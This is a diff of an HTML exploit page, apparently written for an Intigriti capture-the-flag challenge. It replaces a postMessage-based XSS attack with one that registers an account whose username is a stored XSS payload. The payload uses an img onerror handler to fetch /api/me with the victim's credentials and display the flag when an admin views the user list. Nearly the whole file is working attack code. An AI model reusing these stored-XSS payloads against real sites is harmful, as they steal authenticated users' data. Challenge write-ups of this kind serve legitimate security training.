@@ -1,17 +1,25 @@
 <!DOCTYPE html>
 <html>
 <body>
-<button id=b>Claim BTC</button>
+<h3>Registering XSS account...</h3>
 <script>
-const b=document.getElementById('b');
-b.onclick=()=>{
-    const w=open('https://challenge-0126.intigriti.io/checkout.html?currency=BTC&price=45000','x');
-    setTimeout(()=>{
-        const p=`<img src=x onerror="fetch('/api/me',{credentials:'include'}).then(r=>r.json()).then(d=>alert(d.flag))">`;
-        w.postMessage({type:'submitTransaction',transaction:{toAddress:'bc1q',currency:'BTC',amount:0.0001,nickname:p}},'*');
-    },3000);
-};
-setTimeout(()=>b.click(),500);
+// Register with XSS payload as username
+const randomUser = 'user_' + Math.random().toString(36).substr(2, 9);
+const xssUser = `<img src=x onerror="fetch('/api/me',{credentials:'include'}).then(r=>r.json()).then(d=>alert('FLAG: '+d.flag))">`;
+
+fetch('https://challenge-0126.intigriti.io/api/register', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({
+        username: xssUser,
+        password: 'Test1234!'
+    })
+})
+.then(r=>r.json())
+.then(d=>{
+    document.body.innerHTML = '<h3>Registered! Admin will trigger XSS when viewing user list.</h3>';
+})
+.catch(e=>document.body.innerHTML = '<h3>Error: '+e+'</h3>');
 </script>
 </body>
 </html>
